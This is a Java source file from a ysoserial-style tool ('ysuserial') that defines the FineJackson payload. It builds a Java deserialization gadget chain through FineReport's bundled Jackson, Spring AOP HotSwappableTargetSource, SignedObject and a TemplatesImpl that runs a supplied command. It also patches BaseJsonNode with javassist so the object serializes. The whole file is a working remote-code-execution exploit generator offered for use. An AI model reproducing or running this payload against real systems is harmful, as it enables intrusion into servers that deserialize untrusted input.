package org.su18.ysuserial.payloads.gadgets;

import com.fr.third.fasterxml.jackson.databind.node.POJONode;
import com.fr.third.springframework.aop.target.HotSwappableTargetSource;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.su18.ysuserial.payloads.ObjectPayload;
import org.su18.ysuserial.payloads.annotation.Authors;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.Gadgets;
import org.su18.ysuserial.payloads.util.PayloadRunner;
import org.su18.ysuserial.payloads.util.TemplatesUtils;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.security.SignedObject;
import java.util.HashMap;

@Dependencies({"com.fr.third.fasterxml.jackson.core:jackson-databind:2.x"})
@Authors({Authors.DEMO})
public class FineJackson implements ObjectPayload<Object> {
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(FineJackson.class, args);
    }
    public Object getObject(final String command) throws Exception {
        final Object template = Gadgets.createTemplatesImpl(command);
        try {
            CtClass ctClass = ClassPool.getDefault().get("com.fr.third.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
            ctClass.removeMethod(writeReplace);
            // 将修改后的CtClass加载至当前线程的上下文类加载器中
            ctClass.toClass();
        }
        catch (Exception e){
        }

        POJONode node = new POJONode(TemplatesUtils.makeTemplatesImplAopProxy(template));
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        TemplatesUtils.setFieldValue(val,"val",node);

        SignedObject s = TemplatesUtils.makeSignedObject(val);
        POJONode node2 = new POJONode(s);

        HotSwappableTargetSource h1 = new HotSwappableTargetSource(node2);
        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString("xxx"));

        HashMap<Object, Object> hashmap = new HashMap<>();
        TemplatesUtils.setFieldValue(hashmap, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, h1, h1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, h2, h2, null));
        TemplatesUtils.setFieldValue(hashmap, "table", tbl);

        return hashmap;

    }
}
